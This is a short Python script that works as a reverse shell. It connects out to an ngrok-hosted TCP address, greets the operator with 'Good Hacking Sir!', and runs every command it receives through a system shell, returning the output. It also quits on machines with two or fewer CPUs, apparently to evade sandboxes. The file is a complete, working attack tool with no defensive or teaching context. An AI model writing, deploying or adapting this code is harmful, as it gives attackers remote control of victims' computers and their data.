import os
import socket
import subprocess
import time

if os.cpu_count() <= 2:
    quit()

HOST = '7.tcp.eu.ngrok.io'
PORT = 14488
print("[*]Payload Sended")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(str.encode("[*] Connection Waited!\n"))
time.sleep(5)
s.send(str.encode("[*] Connection Established!\n"))
s.send(str.encode(""))
time.sleep(1)
s.send(str.encode("[*] Good Hacking Sir!\n"))


while True:
    try:
        s.send(str.encode("Tron@Shell:-> "))
        data = s.recv(1024).decode("UTF-8")
        data = data.strip('\n')
        if data == "quit":
            break
        if data[:2] == "cd":
            os.chdir(data[3:])
        if len(data) > 0:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
            stdout_value = proc.stdout.read() + proc.stderr.read()
            output_str = str(stdout_value, "UTF-8")
            s.send(str.encode("\n" + output_str + "\n"))
    except Exception as e:
        continue
    
s.close()
